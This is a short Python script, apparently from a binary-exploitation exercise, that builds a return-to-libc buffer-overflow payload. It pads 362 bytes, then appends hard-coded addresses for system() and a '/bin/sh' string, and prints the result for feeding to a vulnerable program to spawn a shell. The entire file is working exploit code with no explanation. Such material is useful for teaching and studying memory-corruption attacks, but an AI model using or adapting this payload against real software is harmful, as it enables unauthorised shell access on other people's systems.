import struct

offset = 'A' * 362

libc = 0xb7e44000

system = struct.pack("I", 0xb7e62310)

sh = struct.pack("I", 0xb7f84bac)

payload = offset + system + "AAAA" + sh

print(payload)
